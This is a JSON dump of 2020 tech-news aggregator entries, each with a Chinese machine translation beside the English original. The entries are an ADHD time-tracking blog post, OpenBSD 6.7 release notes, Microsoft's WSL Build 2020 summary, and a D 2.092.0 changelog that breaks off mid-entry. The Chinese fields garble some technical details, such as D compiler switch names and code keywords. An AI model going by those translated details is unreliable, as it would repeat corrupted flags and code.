[{"category": "", "categoryclass": "", "imagename": "be18dde51807fe29c5a19614120770da.png", "infoid": 1002883, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "以下是一些关于自动时间跟踪的小贴士，特别是对于ADHD患者：如何获得即时反馈，以便采取行动，而不是内疚。\ntl；dr：Qbserve当我使用MacOS时，现在的RescueTime+Custom New URL Tab(Chrome扩展)指向它的报告，这样我就可以立即获得关于我的工作效率(激励我继续前进)或我的懈怠程度(激励我开始工作)的反馈。另外，我使用Intent，用于网页浏览。\n我再怎么强调“立即”这个词也不为过。延迟的报告(一周后、一天后或每当我检查时)确实提供了一些现实检查和对要更改的内容的洞察力(通常只是第一次)，但对实际实施这些更改没有什么用处。(如果有关系的话，我有多动症。对一些人来说，洞察力可能就足够了。)。\n那么时间是什么呢？如果没人问我，我知道是什么。如果我想向问我的人解释，我不知道。-河马的奥古斯丁。\n我所知道的是我记不住时间。我飘忽而出，进入梦想和想法的内心世界。我需要某种“假肢”来维持我的日常功能，甚至可以让我保持在正常的轨道上。举个简单的例子：从15岁左右开始，我总是戴手表(不，口袋里的智能手机是不够的)。如果我没有它，我会感到困惑。\n那工作呢？自由职业很棒，给了我我想要的自由和灵活性。然而，它的代价是缺乏外部结构，以启动工作并使其保持在正轨上。有时需要检查单个(与之相关！)。LINK，和2h都不见了(在兔子洞潜水后)。\n我的手表(Fitbit，激励我多走多睡；足够一周充电一次)，\n所有东西的闹钟(我需要在晚上开会吗？我设了一个闹钟)。\n让我和大家分享一下是什么帮助我进行自我间谍，我的意思是，时间跟踪。我需要两样东西：\n我怎么强调后者都不为过。如果我在一周后，甚至一天后得到一个总结，它会让我感到内疚(这是我擅长的！)，但它不会有任何帮助。我会继续责备自己，继续偷懒/犯罪。\n我需要的是一位始终守望的神，它也能提供即时的反馈。(“在电子游戏方面没有ADHD。”--我们力求得到快速、客观、可行的反馈！)。\n更重要的是，任务栏中的始终监视立方体显示了我的工作效率得分(占6%的那个)：\n当我看到它很低的时候，我就有动力开始工作，它有很高的继续工作的动力(作为参考，6%是很低的；但我当天没有使用这台笔记本电脑工作)。\n然而，在2019年12月，我带来了一台新的笔记本电脑，这一次是Windows。令我惊讶的是，设置开发环境非常容易(Anaconda、Node和VSCode的工作方式几乎相同)。另一件事开始成为挑战：既然我不能使用Qbserve，而且功能强大的显卡除了深度学习之外还有其他很好的用途，如何提高工作效率？我安装了RescueTime。\n它跟踪得相当好，但忽略了一个核心功能-实时反馈。也就是说，我知道我可以在Wish上看到报告，但我希望经常得到反馈。它不能以我有意识地检查它为条件。\n我寻找扩展，以便在任务栏上看到它，但无济于事。然而，然后它就断了。我使用了一些扩展来用新的选项卡来激励自己：死亡率新选项卡(在“额外的”中有更多)或一个不那么病态的选项卡：动量。为什么不直接将新选项卡设置为RescueTime呢？\n现在，每次我打开一个新选项卡(我一直都这样做)，就会得到一个现实检查。我或多或少知道我是如何拖延某一天的，所以我不需要它的摘要。不过，时间的总结是无价的。注意：默认视图位于https://www.rescuetime.com/dashboard.。\n如果你认为我低估了政府破坏我的力量，那你就低估了我自我破坏的能力。但是，如果您更喜欢开源(更注重隐私)的替代方案，可以使用ActivityWatch，它可以与相同的URL选项卡重定向一起使用，此http://localhost:5600/#/timeline。\n界面稍微不那么精致(不幸的是，我在打开它和获取图表之间遇到了延迟)，但跟踪功能可以正常工作。因为它是我喜欢的Vue，有一天我可能会根据我的需要修改它。\n最近，我在所有机器上都使用了一个插件：Intent，这是我从一个HN线程中学到的。(我在Qbserve/Rescue Time之上使用了它，而不是代替它！)。它只适用于选项卡，但因为它是我分心的主要来源(“再看一段视频”、“再看一条评论”等)，所以它很重要。\n最好的时光是在高中的时候，写一篇数学论文，休息一下玩Timeshock游戏(一块插板，没有故事情节)。我们都知道没有休息是不好的：\n问题是，当我漂移时，不是清爽的15分钟，而是一段2小时的兔子洞之旅，不仅消耗了我的时间，还消耗了我的注意力。但目前的大多数软件都没有解决这个问题。\n午夜过后，我使用社交媒体，但这并没有阻止我，而是在第二天削减了全球限制。\n当一个应用程序在没有任何警告的情况下把我踢出去时，会有一个令人讨厌的惊喜。它是如此令人不快(特别是当我正在写一条长长的评论的时候)，它可能会提示我卸载它。\n限制太严格了。有时我知道某一天我需要更多的社交媒体。\n我看到了倒计时(所以我知道是结束回复，还是开始写新的有意义)，\n然而，它将YouTube的“正常使用”与例如用于创建深度学习研讨会(查找最近论文的视频摘要)区分开来。\n我使用Toggl对按小时计酬(少数人)的项目进行时间跟踪。我试着把它用在其他项目上，有时它会让我更容易保持在正轨上。然而，我经常忘了打开它。\n有几个插件(例如ColdTurkish)是“太核”的。在没有事先警告的情况下，(在Facebook或Hacker News上)在写回复的过程中被停下来，让我感到不安。更糟糕的是，当我把它用在我的工作中时，在数据科学或量子游戏中。\n我对Pomodoro有断断续续的感觉，但它不是一直有效的，尤其是当我自己使用的时候-不是这样的。有几天，我没有一个应用程序能用得更多。我经常在启动或重新启动时遇到问题。波莫多罗在其他人控制时间的时候工作(或者我们轮流工作，我知道其他人也依赖于此)，但不是单独工作。\n附注：为什么所有跟踪时间的软件都假定这一天从午夜开始？(午夜似乎与平均睡眠时间相差甚远。)。\n我希望它能给你一点追踪时间的灵感。如果它激励了你，那就太好了--不管你是否患有多动症。当然，你认为什么是宝贵的时间，是多么让人分心，这取决于你。我们需要承认，创造性的工作需要在随机追求和灵感之间取得平衡，并集中精力完成一些事情。而且，休息不是让人分心的东西。虽然我拖拖拉拉很多，但我正在慢慢地学习如何休息(例如，一个革命性的想法，一次小便有一天\n明确地说，这样的时间跟踪对我有帮助，但远不能解决我的问题。与约会的话题不同，我希望从一无所知到相当能干，而当谈到时间组织时，我从一无所知变成了稍微不那么有头绪。\n如果你在时间安排上苦苦挣扎，我推荐爱德华·哈洛威尔和约翰·拉蒂所著的“如何处理时间安排”、YouTube频道和“分心驱动：识别和应对注意力缺陷障碍”一书。“假肢”一词来自他们的书，在书中，他们将ADHD比作近视。戴眼镜或镜片是一个可以接受的解决方案，人们不会被强迫“更努力地眯着眼睛”。\n我感谢wojciech jabłoński打扰我写这篇文章来写《多动症技术栈》(这是他的标题)；感谢安娜卡尔皮克对草案的评论。它是这样开始的：https://news.ycombinator.com/item?id=22854491.。\n如果有需要，我很乐意用Evernote写在我的待办事项清单上。我发现它比典型的TODO应用程序更有用，因为它更符合“子弹日记”(Bullet Journal)的风格：如果我不做一项任务，它就会消失，除非我有意识地重新写下它。\n我的一位密友向我展示了他的展示，背景是一个长方形。\n嗯，它是365x100像素，你的生命中没有那么多的日子。想一想每一天，如果你以一种重要的方式度过它。\n我的桌面乱七八糟，所以我很少看到它。但几年来，我一直看到每个新选项卡(死亡率-新选项卡)：\n这是一种现代的“纪念森里”。颇具讽刺意味的是，它激励我尽情地生活。每次新的标签，我都会问自己“打开这个网站是不是我能用这段时间做的最好的事情？”它不是用来娱乐的，它让我不会无意中让时间从我的手指间流过。", "note_en": "A few tips on automatic time tracking, especially for people with ADHD: how to get immediate feedback, for actions, not guilt.\n tl;dr: Qbserve when I was on macOS, now RescueTime + Custom New URL Tab (Chrome extension) pointing its report, so I get immediate feedback on my productivity (motivates me to keep moving), or the depth of my slacking (motivates me to start working). Plus I use Intention, for web browsing.\n I cannot stress enough the word  immediate. Delayed reports (after a week, after a day, or whenever I check) sure give a bit of reality-check and insight on what to change (usually only the first time) but were not useful for actually implementing these changes. (I have ADHD if that matters. For some people insight might be enough.)\n  What then is time? If no one asks me, I know what it is. If I wish to explain it to him who asks, I do not know. — Augustine of Hippo\n What I do know is that I cannot keep track of time. I zone out, into the inner world of dreams and ideas. I need some kind of “prosthetics” for my daily functioning, to even remotely stay on track. As a simple example: since being 15 or so I always wear a watch (no, a smartphone in the pocket is not enough). If I am without it, I feel confused.\n And how about work? Freelancing is great and gives me the freedom and flexibility I desire. However, it comes as the cost of the lack of external structure, to get work started and keep it on track. Sometimes it takes checking a single (snd relevant!) link, and 2h are gone (after a rabbit hole dive).\n    my watch (Fitbit, motivates me to walk more and sleep more; enough to charge once a week),\n  alarms for everything (I need to for a meeting in the evening? I set an alarm).\n Let me share what helped me with self-spying, I mean, time tracking. I need two things:\n  I cannot overemphasize the latter. If I get a summary after a week, or even — after a day, it will guilt-trip me (at which I excel!), but it won’t be helpful. I will keep blaming myself, keep slacking/sinning.\n  What I need is an always-watching deity that also provides immediate feedback. (“ There is no ADHD when it comes to video games.” — we strive on fast, objective&amp; actionable feedback!)\n    What is even more important, is the always-watching-cube in the taskbar, displaying my productivity score (the one with 6%):\n    When I see it is lowish, I am motivated to start working, with it is high — motivated to continue (for reference, 6% is very low; but I didn’t use this laptop for work the given day).\n  However, in Dec 2019 I brought a new laptop, this time with Windows. To my surprise, it was easy to set up a dev environment (Anaconda, Node, and VSCode work almost the same). Another thing started to be a challenge: how to be productive, since I cannot use Qbserve AND  a powerful graphics card has other good uses than deep learning? I installed  RescueTime.\n  It tracks reasonably well but misses one core feature — real-time feedback. That is, I know I can see reports at wish, but I would love to get frequent feedback. It cannot be conditional on my consciously checking it.\n I looked for extensions so that I would see it on the taskbar but to no avail. However, then it snapped. I used some extensions to motivate myself with new tabs:  Mortality New Tab (more on that in the “extra”) or a less morbid one:  Momentum. Why not setting a new tab to RescueTime directly?\n  Now each time I open a new tab (which I do all the time) get a reality check. I more or less know how I procrastinate a given day, so I don’t need a summary of it. A summary of time is invaluable, though. A small note: the default view is at  https://www.rescuetime.com/dashboard.\n  If you think that I underestimate the government power to sabotage me, you underestimate my ability to self-sabotage myself. However, if you prefer an open-source (and much more privacy-focused) alternative, there is  ActivityWatch, that would work with the same URL tab redirect, this  http://localhost:5600/#/timeline\n  The interface is slightly less polished (and, unfortunately, I experience a delay between opening it and getting a chart), but the tracking works. Since it is  in Vue I love, one day I might modify it to my needs.\n  There is one, very recent, plugin I use on all machines:  Intention, I learned from  an HN thread. (I used it on top of Qbserve / Rescue Time, not instead of it!) It works only for tabs, but since it is my main source of distractions (“ just one more video”, “ just one more comment”, etc), it matters.\n    The best time ever was when in high school, writing a mathematical paper, and taking breaks with Timeshock game (a pinboard, no storyline). We all know that no breaks is bad:\n  The problem is when I drift, and instead of a refreshing 15 min, it is a 2h rabbit hole journey, eating not only my time but also attention. But most of the current software does not address that.\n I use social media after midnight, and it does not stop me then but cuts the global limit for the next day.\n There is a nasty surprise when an app kicks me out, with no warning. It is so unpleasant (especially when I am in the middle of writing a long comment) that it may prompt be to uninstall it.\n Too strict limits. Sometimes I know that a given day I need more social media.\n  I see the countdown (so I know if to wrap-up a reply, or if it makes sense to start writing a new one),\n  yet, it distinguishes between “normal use” of YouTube and e.g. using it for creating a workshop on deep learning (looking for video abstract of recent papers).\n  I use  Toggl for time tracking for projects in which I am paid by the hour (minority). I tried it to use for other projects, and sometimes it makes it easier to stay on track. However, I often forgot to switch it on.\n There are a few plugins (e.g. ColdTurkey) that are “too nuclear”. Being halted in the middle of writing a reply (on Facebook or Hacker News), with no prior warning, left me disturbed. Even worse, when I used it for my WORK stuff, in data science or Quantum Game.\n I have my on-and-offs with Pomodoro, but it does not work on a consistent basis, and least — not when self-applied. There was not a single app I was able to use more for a few days. Often I had a problem with starting or restarting. Pomodoro worked when sometime else was controlling time (or we took turns, and I knew others depend on that as well), but not for solo work.\n Side note: why ALL time-tracking pieces of software assume that day starts at midnight? (Midnight does not seem to be anywhere near to the average of sleep time.)\n  I hope it inspired you a bit to track time. If it inspired you, great — no matter if you have ADHD or not. Of course, it is up to you what you consider a valuable time, and what a distraction. We need to admit that creative work pretty much needs a balance between random pursuits and inspirations, and focus to get something done. Also, rest is something different than a distraction. While I procrastinate a lot I am slowly learning how to rest (e.g. a revolutionary idea of having a day a wee\n To make it clear, such time-tracking helped me but is far for solving my problems. Unlike the topic of  dating, where I want from clueless to fairly competent, when it comes to time organization I went from clueless to slightly less clueless.\n If you struggle with time organization, I recommend  How to ADHD Youtube channel and  Driven to Distraction: Recognizing and Coping with Attention Deficit Disorder book by Edward Hallowell &amp; John Ratey. The term “prosthetic” comes from their book, in which they compare ADHD to be short-sighted. Wearing glasses or lenses is an acceptable solution, and people are not pushed to “just squint their eyes harder”.\n I thank Wojciech Jabłoński for bugging me to write it to write “ADHD tech stack” (it’s his title); thanks Anna Karpiuk for remarks on the draft. It started as this comment:  https://news.ycombinator.com/item?id=22854491.\n If there is a need, I am happy to write on my TODO list with Evernote. I find it more useful than typical TODO apps, as it is more in the line of the Bullet Journal: if I don’t do a task, it is gone unless I take a conscious effort to write it down again.\n  A close friend of mine showed me his display, with a rectangle in the background.\n   Well, it is 365 x 100 pixels, and there are not as many days in you life. Think about every day, and if you spend it in a way that matters.\n My desktop is cluttered, so I rarely see it. But for a few years I have been seeing with each new tab ( Mortality — New Tab):\n  It is a modern-day “ memento mori”. Quite ironically, it motivated me to live to the fullest. With each new tab, I asked myself “ Is opening this website the best thing I can do with this piece of time?”. It didn’t hold me for entertainment; it held me from making time pass through my fingers, unintentionally.", "posttime": "2020-05-20 06:06:59", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "技术,tech,时间", "title": "ADHD技术堆栈：自动时间跟踪，以获得可行的反馈，而不是负罪感", "title_en": "ADHD tech stack: auto time tracking to get actionable feedback, not guilt", "transed": 1, "url": "https://medium.com/@pmigdal/adhd-tech-stack-auto-time-tracking-b8ff5b6bc888", "via": "", "real_tags": ["技术", "tech", "时间"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1002881, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "OpenBSD 6.7是今天早上发布的，它是这个注重安全的BSD操作系统的最新版本。OpenBSD6.7的众多变化包括：-FFS2文件系统改进，包括对新安装默认使用64位时间戳和块号。-支持ARM64上的Raspberry PI 4，同时也改进了对Raspberry PI 3的支持。Raspberry PI 2/3对OpenBSD ARMv7的支持也得到了改进。-更好地支持Pinebook Pro等RockChip系统。-各种SMP改进，包括更好的AMD SMT/核心/封装检测。-各种不同的硬件驱动程序改进，包括英特尔AX200 WiFi设备支持。-为支持FIDO/U2F安全密钥而引入的FIDO驱动程序。-修复了在不同USB 3.0控制器上使用USB 2.0设备时的处理。-PowerPC OpenBSD版本切换到Clang作为其默认代码编译器。-各种dhclient修复。--各项安全改进。OpenBSD6.7更改的大列表可以通过OpenBSD.org上的发布声明找到。", "note_en": "OpenBSD 6.7 was released this morning as the newest version of this security-minded BSD operating system.\r   Among the many changes with OpenBSD 6.7 are:\r   - FFS2 file-system improvements including using 64-bit timestamps and block numbers by default for new installs.\r   - Support for the Raspberry Pi 4 on ARM64 while improving the Raspberry Pi 3 support too. Raspberry Pi 2/3 support has also improved for OpenBSD ARMv7.\r   - Better support for Rockchip systems like the Pinebook Pro.\r   - Various SMP improvements including better AMD SMT/Core/Package detection.\r   - A wide variety of different hardware driver improvements, including Intel AX200 WiFi device support.\r   - A FIDO driver introduced for FIDO/U2F security keys support.\r   - Fixed handling of USB 2.0 devices when in use on different USB 3.0 controllers.\r   - The PowerPC OpenBSD build switched over to Clang as its default code compiler.\r   - Various dhclient fixes.\r   - Various security improvements.\r   The big list of OpenBSD 6.7 changes can be found via the release announcement on  OpenBSD.org.", "posttime": "2020-05-20 05:37:08", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "发布,openbsd,改进", "title": "OpenBSD 6.7发布", "title_en": "OpenBSD 6.7 Released", "transed": 1, "url": "https://www.phoronix.com/scan.php?page=news_item&px=OpenBSD-6.7-Released", "via": "", "real_tags": ["发布", "openbsd", "改进"]}, {"category": "", "categoryclass": "", "imagename": "2a22454be31d9434f9cefeed301808b5.png", "infoid": 1002880, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "今年，在一个全虚拟构建会议上，我们发布了许多关于Windows Subsystem for Linux(WSL)的令人兴奋的消息！这篇博客为您提供了所有WSL新闻的摘要，包括现在可用的和未来可以期待的。\n对Windows Subsystem for Linux 2(WSL 2)发行版的支持将于本月在Windows 10 2020年5月更新中提供。\n4年前，在Build 2016上，微软宣布了Windows Subsystem for Linux-WSL(当时也称为“Bash on Ubuntu on Windows”)，这让世界大吃一惊。WSL使Windows用户可以直接在Windows中运行原生的、未经修改的Linux命令行工具和应用程序，以及他们喜欢的所有Windows应用程序和工具。WSL的使用量已经从最初只有几千人下载第一个预览版，发展到今天超过350万台月度活跃设备！\n然而，我们希望WSL能做得更多--运行所有的Linux应用程序和工具，并更快地运行应用程序和工具。在Build 2019上，WSL团队发布了WSL 2的第一个预览版，它利用Windows的Hypervisor平台中的新功能在容器中运行发行版和工具，该容器位于真正的Linux内核映像之上，该映像由Microsoft构建和交付，托管在一个轻量级VM中，从冷启动不到2秒！这意味着WSL2提供了与真正的Linux内核的完全系统调用兼容性，并且比WSL的早期版本快3-6倍。您可以使用以下命令轻松地将任何WSL发行版的版本设置为使用WSL2：wsl.exe--set-version&lt；DistroName&gt；2。\n社区的反应是巨大的，坦率地说，是积极压倒性的-最诚挚地感谢运行WSL2、提交问题和要求特性的每个人，您帮助我们使WSL2比我们希望的更好！\n在WSL 2宣布后不久，Docker Inc.。决定在WSL 2上托管Docker Desktop for Windows！经过一段成功的预览期后，Docker宣布Docker Desktop for Windows在2020年5月10日的Windows更新上安装时，将默认在WSL 2上运行，这也将把Docker Desktop带给Windows Home用户。\n对WSL 2上的主机Docker的这一更改将导致Containers更快地启动，同时由于WSL 2与完整的虚拟机相比占用更少的资源，因此在主机上消耗的资源更少。\n您很快就可以使用单个命令安装WSL。只需打开Windows终端并输入`wsl.exe-install`\n关于WSL的一个常见抱怨是它不容易找到并启用。我们同意这一点，这就是为什么我们正在对wsl.exe命令行工具进行一些改进，以帮助您安装WSL。很快，您就可以通过在命令行中输入：wsl.exe--install来简单地安装WSL了！\n此命令将添加到每台Windows计算机上，因此您只需打开一个以管理员权限提升的终端窗口，然后运行wsl.exe--install。从那里将启用WSL可选组件，并且您指定的发行版将在重启时自动下载和安装。\n在接下来的几个月里，你可以在Windows Insiers Fast Ring中看到这个功能的初始版本。\n我们还将在首次安装WSL时引入更改，使WSL2成为新的默认分发类型。WSL2带来了重大改进，我们发现我们的Insider分支机构上的大多数用户都在使用WSL2发行版。在开发wsl.exe--install时，将其默认为人们正在使用的WSL 2是有意义的，当启用‘Windows Subsystem for Linux’可选组件时，我们也将其包括在任何新安装的WSL中。在接下来的几个月里，您将在wsl.exe(安装改进)的同时，在Insiers Fast Ring中看到这些更改。\n从我们的第一个版本开始，将CUDA和/或GPU计算支持添加到WSL一直是我们最受欢迎的功能！在过去3年多的时间里，WSL、虚拟化、DirectX、Windows驱动程序团队和我们的芯片合作伙伴一直在努力进行复杂的工程壮举，以交付此功能。\n这就是为什么我们很高兴地宣布，我们将在未来几个月内开始在Windows10Insider版本中预览对WSL的GPU计算支持！\nDirectML团队将发布带有DirectML后端的TensorFlow预览包，支持跨各种Windows硬件的AI&amp；ML工作负载的硬件无关加速-DirectML还将支持本机Windows，包括Windows上的TensorFlow！\n此预览版发布后，您只需确保安装了最新的Windows Insider Fast Build，安装了WSL 2，并从硬件供应商为您的GPU安装了正确的驱动程序，然后您就可以开始在WSL中开发、培训和测试您的机器学习和AI模型了！\n这一变化将在接下来的几个月内发布给Windows Inside Fast Ring。有关此更改的所有详细信息以及它是如何实现的，请阅读DirectX开发人员的博客文章。\n我们另一个最多产的请求之一是不仅要支持命令行应用程序，还要支持Linux GUI应用程序。例如，一些用户希望在Linux环境中运行他们首选的Linux GUI文本编辑器或IDE，并处理本地存储在发行版文件系统中的代码，或者简单地在他们的Windows机器上开发Linux GUI应用程序。\n我们的目标是让您能够与Windows应用程序一起在桌面上无缝运行Linux GUI应用程序。这将使您能够使用Linux应用程序编辑、构建和运行代码，在Python中可视化数据绘图，甚至使用针对Linux环境优化的应用程序。\n在Build中，我们演示了这项工作的早期版本，直接从WSL运行了几个GUI示例应用程序，比如Eye of Gnome、Gedit和MPV媒体播放器。这些应用程序连接到在WSL内部运行的Wayland服务器，该服务器与Windows主机上的RDP客户端通信。您可以在下面的屏幕截图中看到这一点，其中我们同时在WSL和Outlook中运行GNOME文件管理器。\n这些变化都在WSL的团队路线图上，您可以期待在2020年假期之前听到更多关于这项工作的信息。\n总而言之，一旦您更新到2020年5月10日的Windows 10更新，您将完全支持WSL 2发行版！如果你加入了Windows Insiders Fast Ring，你将在接下来的几个月内准备好开始接收最新的WSL功能，包括新的安装体验和GPU计算。\nWSL有很多令人兴奋的新闻和功能，所以请继续关注这个博客，了解任何重大公告的细节。你可以在Twitter@Craigaloewen上关注我，也可以在Twitter上关注WSL团队的成员，了解那里的任何新闻。请查看Kevin Gallo的博客文章，了解Build中所有针对Windows开发人员的新闻。感谢您对WSL的支持！", "note_en": "This year at an all virtual BUILD conference we had many exciting announcements for the Windows Subsystem for Linux (WSL)! This blog post gives you a summary of all the WSL news, including what’s available now and what you can expect in the future.\n     Support for Windows Subsystem for Linux 2 (WSL 2) distros is coming this month in the Windows 10 May 2020 Update\n 4 years ago, at Build 2016, Microsoft surprised the world by announcing Windows Subsystem for Linux – WSL (also known at the time as “Bash on Ubuntu on Windows”). WSL enables Windows users to run native, unmodified Linux command-line tools and apps directly in Windows, alongside all their favorite Windows apps and tools. WSL usage has grown enormously from initially just a few thousand people downloading the first preview build to more than 3.5 million monthly active devices today!\n However, we wanted WSL to do more – to run all Linux apps and tools, and to run apps and tools faster. At Build 2019, the WSL team unveiled the first preview of WSL 2, which utilizes new capabilities in Windows’ Hypervisor Platform to run distros and tools in containers,  atop a real Linux kernel image that is built and delivered by Microsoft, hosted in a lightweight VM, which boots from cold in less than 2s! This means that WSL 2 delivers full system call compatibility with a real Linux kernel and is 3-6x faster compared to earlier versions of WSL. You can easily set the version of any WSL distro to be using WSL 2 with the command:  wsl.exe --set-version &lt;distroName&gt; 2.\n The response from the community has been huge and, frankly, positively overwhelming – sincerest thanks to everyone who ran WSL 2, filed issues, and asked for features, you’ve helped us make WSL2 even better than we hoped it could be!\n   Shortly after WSL 2 was announced, Docker Inc.  decided to host Docker Desktop for Windows atop WSL 2! Following a successful preview period, Docker has announced that Docker Desktop for Windows will now default to run atop WSL 2 when installed on the Windows 10 May 2020 update, which will bring  Docker Desktop to Windows Home users as well.\n This change to host Docker on WSL 2 will result in containers booting up faster, while consuming fewer resources on the host machine due to WSL 2’s more lightweight footprint vs. full VMs.\n   You’ll soon be able to install WSL with a single command. Just open a Windows Terminal and enter `wsl.exe –install`\n One common complaint about WSL is that it’s not easy to find and enable. We agree, which is why we’re working on some improvements to the wsl.exe command-line tool to help you install WSL. Soon you will be able to simply install WSL by entering:  wsl.exe --install in your command-line!\n  This command will be added to every Windows machine so that all you need to do is open a Terminal window elevated with administrator privileges and run  wsl.exe --install. From there the WSL optional components will be enabled, and your specified distro will be downloaded and installed for you automatically upon restart.\n You can expect to see initial releases of this feature in the next few months in the Windows Insiders Fast Ring.\n  We’re also introducing the change to make WSL 2 the new default distribution type when installing WSL for the first time. WSL 2 brings significant improvements and we found that the majority of our users on Insider branches are using WSL 2 distros. When developing  wsl.exe --install it made sense for it to default to what people are using: WSL 2, and we’ve included this as well for any new installations of WSL when enabling the ‘Windows Subsystem for Linux’ optional component. You’ll see these changes in the Insiders Fast ring in the next few months alongside the  wsl.exe --install improvement.\n  Adding  CUDA and/or  GPU Compute support to WSL has been our #1 most requested feature since our first release! Over the last 3+ years, the WSL, Virtualization, DirectX, Windows Driver teams, and our silicon partners have been working hard on a complex engineering feat to deliver this capability.\n This is why we’re thrilled to announce that we will start previewing GPU compute support for WSL in Windows 10 Insider builds within the next few months!\n  DirectML The team will be releasing a preview package of TensorFlow with a DirectML backend enabling hardware agnostic acceleration of AI &amp; ML workloads across the breadth of Windows hardware – DirectML will also support native Windows too, including TensorFlow on Windows!\n Once this preview is released, you will simply need to ensure that you have the latest Windows Insider Fast build, WSL 2 installed, install the correct driver for your GPU from the hardware vendor, and then you’ll be ready to start developing, training and testing your machine learning and AI models inside of WSL!\n  This change will be released to the Windows Insiders Fast ring in the next few months. For all the details of what this change means and how it was made possible, please read  the DirectX Developer blog post.\n  One of our other most prolific requests is to support not just command-line apps, but Linux GUI apps as well. For example, some users want to run their preferred Linux GUI text editor or IDE in a Linux environment and work on their code stored locally within their distro’s filesystem, or simply develop Linux GUI apps on their Windows machine.\n Our goal is for you to be able to run Linux GUI apps on your desktop seamlessly alongside your Windows apps. This will enable you to use Linux apps to edit, build, and run your code, visualize data plots in Python, or even use applications that are optimized for a Linux environment.\n At BUILD we demonstrated an early version of this work, running a few GUI sample apps directly from WSL such as  Eye of Gnome,  gedit and the  mpv media player. These apps connected to a wayland server running inside of WSL, which communicated with a RDP client on the Windows host. You can see a screenshot of this in action below where we’re running the GNOME file manager in WSL and Outlook side by side.\n  These changes are on the WSL’s team roadmap and you can expect to hear more about this work by holiday 2020.\n  To summarize, once you update to the Windows 10 May 2020 Update you’ll have full support for WSL 2 distros! If you join the Windows Insiders Fast Ring you’ll be ready to start receiving the latest WSL features including the new install experience and GPU compute within the next few months.\n There’s lots of exciting news and features coming to WSL, so please stay tuned to this blog for the details of any big announcements. You can follow me on Twitter  @craigaloewen or  members of the WSL team that are on Twitter for any news there as well. Please check out  Kevin Gallo’s blog post for all of the Windows developer focused news from BUILD. Thank you for supporting WSL!", "posttime": "2020-05-20 05:35:26", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "windows,linux,2020,子系统,subsystem", "title": "Windows子系统for Linux Build 2020摘要", "title_en": "The Windows Subsystem for Linux Build 2020 Summary", "transed": 1, "url": "https://devblogs.microsoft.com/commandline/the-windows-subsystem-for-linux-build-2020-summary/", "via": "", "real_tags": ["windows", "linux", "2020", "子系统", "subsystem"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1002879, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "D 2.092.0中所有错误修复和增强的列表。CLI开关-REVERT=IMPORT和-TRANSION=CHECKIMPORTS已被删除，这些开关已不执行任何操作且已弃用一段时间。编译器将不再识别它们。\nGNU ABI标签是GCC 5.1中用C++11添加的一个特性。为了让D完全支持标准C++库，DMD现在可以识别特殊的UDA gnuAbiTag，它在core.attribute中声明，在object中公开别名(因此不需要导入任何内容就可以使用它)。ABI标记是大多数用户不需要与之交互低级功能，但可用于绑定到需要它的C++库。特别是，当面向C++11及更高版本(DMD switch-extern-std={c++11，c++14，c++17})时，需要绑定std：：string。\n一个符号上一次只能出现一个gnuAbiTag。数组条目的顺序并不重要(它们根据输出进行排序)。只有将-extern-std=c++11或更高版本传递给编译器，UDA才会生效。默认值(-extern-std=c++98)将忽略UDA。此UDA只能应用于外部(C++)符号，不能应用于命名空间。\n不是外部(D)的模块构造函数和析构函数是弃用的模块构造函数和析构函数(共享或非共享)可以标记为与外部(D)不同的链接，这会影响它们的损坏。由于这样的损坏是简单且可预测的，如果在类似条件下声明两个相同类型的构造函数/析构函数，则冲突的可能性非常小，例如，如果模块A中的第三个模块构造函数在线479上，模块B中的第三个模块构造函数也在线479上，则它们将具有相同的损坏。\n虽然在实践中不太可能触发这样的错误，但受影响的符号现在会触发一条弃用消息。\nDIP25违规现在将默认发出弃用DIP25从v2.067.0开始就可用了，首先是作为它自己的开关，最近是在-review=dip25开关下。该功能现在功能齐全，并且已经建立在例如DIP1000的基础上。\n从本版本开始，在将-PREVIEW=dip25传递给编译器时会触发错误的代码也将在没有-PREVIEW=dip25的情况下触发一条弃用消息。交换机的行为不变(仍会发出错误)。\nDIP25旨在使@Safe代码不可能引用析构对象。实际上，可能需要函数和方法返回对其参数的引用，才能将方法或参数限定为返回，正如编译器所提示的那样。\nstruct foo{int x；//返回`this.x`转义对参数`this`的引用，可能使用`rereturn`ref int method()/*return*/{return this.x；}}//返回`v`转义对参数`v`的引用，可能使用`rereturn`ref int标识(/*return*/ref int v){return v；}。\n在这两种情况下，取消对返回注释的注释将安抚编译器。DIP25的完整说明可在此处找到。\n指针的原型所有权/借用系统指针的所有权/借用(又名OB)系统可以保证解除引用的指针指向有效的内存对象。\n这是一个适用于D的原型OB系统。它最初只适用于指针，不适用于动态数组、类引用、引用或聚合的指针字段。添加对这类支持会增加复杂性，但不会改变其性质，因此将其推迟到以后。RAII对象可以安全地管理它们自己的内存，因此不在OB的覆盖范围内。指针是否使用GC或其他存储分配器分配内存对OB来说无关紧要，它们没有区别，处理方式也是一样的。\n系统仅在使用@live属性注释的函数中处于活动状态。它是在进行语义处理之后应用的，纯粹是为了检查是否违反OB规则。未添加任何新语法。不会更改生成的代码。如果@live函数调用非@live函数，则被调用的函数应该呈现与@live兼容的接口，尽管它没有被选中。如果非@live函数调用@live函数，则传递的参数应遵循@live约定。\n它不会检测取消引用空指针或可能的空指针的尝试。这是不可行的，因为当前没有将类型批注为非空指针的方法。\n对于每个内存对象，可以只存在一个指向它的变异指针，也可以存在多个非变异(只读)指针。\n单个变异指针称为内存对象的所有者。它可传递地拥有内存对象和可从其访问的所有内存对象(即内存对象图)。因为它是指向该内存对象的唯一指针，所以它可以安全地管理内存(更改其形状、分配、释放和调整大小)，而不会从可能指向它的任何其他指针(无论是否发生变化)下拉出地毯。\n如果有多个指向内存对象图的只读指针，则它们可以安全地从内存对象图中读取，而不必担心更改了内存对象图。\n设计的其余部分涉及指针如何成为所有者、只读指针和无效指针，以及如何始终保持核心OB原则。\n唯一被跟踪的指针是那些在@live函数中声明为this的指针、函数参数或局部变量。不跟踪来自其他函数的变量，即使是@live函数，因为与其他函数的交互分析完全依赖于该函数签名，而不是其内部。不跟踪常量参数。\n所有者